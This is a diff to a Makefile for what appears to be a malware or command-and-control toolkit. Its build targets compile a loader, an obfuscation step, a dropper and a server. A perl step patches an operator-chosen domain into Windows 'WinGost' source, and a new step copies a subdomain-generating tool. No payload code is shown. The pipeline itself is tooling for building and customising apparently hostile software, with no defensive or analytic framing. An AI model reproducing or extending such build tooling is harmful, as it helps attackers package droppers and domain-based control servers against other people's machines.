@@ -148,10 +148,10 @@ SERVER_LINK_FLAGS = -z noexecstack
 # Source modification pattern
 DOMAIN ?= nothing.venex
 
-.PHONY: all clean install-deps modify-source setup-dirs compile-libs compile-wingost compile-loader compile-tools obfuscate compile-dropper compile-server compile-modules copy-scripts create-client cleanup finalize
+.PHONY: all clean install-deps modify-source setup-dirs compile-libs compile-wingost compile-loader compile-tools obfuscate compile-dropper compile-server compile-modules copy-scripts copy-tools create-client cleanup finalize
 
 # Default target
-all: install-deps clean modify-source setup-dirs compile-libs compile-wingost compile-loader compile-tools obfuscate compile-dropper compile-server compile-modules copy-scripts create-client cleanup finalize
+all: install-deps clean modify-source setup-dirs compile-libs compile-wingost compile-loader compile-tools obfuscate compile-dropper compile-server compile-modules copy-scripts copy-tools create-client cleanup finalize
 	@echo "$(GREEN)[✓]$(NC) Build completed successfully!"
 	@echo "$(CYAN)Final executable: $(FINAL_EXE)$(NC)"
 
@@ -176,6 +176,7 @@ install-deps:
 	@echo "$(BLUE)  → Installing perl...$(NC)"
 	@apt install perl -y || echo "$(RED)  ✗ Failed to install perl$(NC)"
 	@echo "$(GREEN)[✓]$(NC) Dependencies installed"
+	@exit
 
 # Step 2: Clean previous builds
 clean:
@@ -186,7 +187,7 @@ clean:
 # Step 3: Modify source code
 modify-source:
 	@echo "$(YELLOW)[3/17]$(NC) Modifying Wingost source code for domain: $(DOMAIN)..."
-	@perl -pi -e 'if (/main_domain\.topleveldomain/) { $$s=".$(DOMAIN)"; $$l=length($$s) * 2; s/L"\.main_domain\.topleveldomain"/L"$$s"/; s/, 0\);/, $$l);/ }' file.c
+	@perl -pi -e 'if (/main_domain\.topleveldomain/) { $$s=".$(DOMAIN)"; $$l=length($$s) * 2; s/L"\.main_domain\.topleveldomain"/L"$$s"/; s/, 0\);/, $$l);/ }' gostInit/windows/core/WinGost.c
 	@echo "$(GREEN)[✓]$(NC) Source code modified"
 
 # Step 4: Create directory structure
@@ -287,7 +288,7 @@ $(DROPPER_EXE): $(OBFUSCATE_OBJ)
 compile-server: $(SERVER_EXE)
 $(SERVER_EXE): $(ENCRYPT_O)
 	@echo "$(YELLOW)[11/17]$(NC) Compiling server..."
-	@$(GCC) server/server.c $(ENCRYPT_O) -o $@ $(SERVER_FLAGS)
+	@$(GCC) server/cross_platform_server.c $(ENCRYPT_O) -o $@ $(SERVER_FLAGS)
 	@echo "$(GREEN)  → $(SERVER_EXE) created$(NC)"
 
 # Step 12: Compile modules
@@ -318,6 +319,11 @@ copy-scripts:
 	@cp moduloScript/* $(MODULOSCRIPT_DIR)/
 	@echo "$(GREEN)[✓]$(NC) Modulo scripts copied"
 
+copy-tools:
+	@echo "$(YELLOW)[13.1/17]$(NC) Copying subdomainGenerater tool..."
+	@cp server/subdomainGenerating.py $(TOOLS_DIR)/
+	@echo "$(GREEN)[✓]$(NC) subdomainGenerater copied"
+
 # Step 14: Create client structure
 create-client:
 	@echo "$(YELLOW)[14/17]$(NC) Creating client structure..."
@@ -338,7 +344,7 @@ cleanup:
 	@echo "$(BLUE)  → Removed $(LIB_DIR)$(NC)"
 	@rm -rf $(INCLUDES_DIR)
 	@echo "$(BLUE)  → Removed $(INCLUDES_DIR)$(NC)"
-	@rm -rf $(TOOLS_DIR)
+	@rm -rf $(TOOLS_DIR)/obfuscate
 	@echo "$(BLUE)  → Removed $(TOOLS_DIR)$(NC)"
 	@rm -f $(LOADER_EXE)
 	@echo "$(BLUE)  → Removed $(LOADER_EXE)$(NC)"
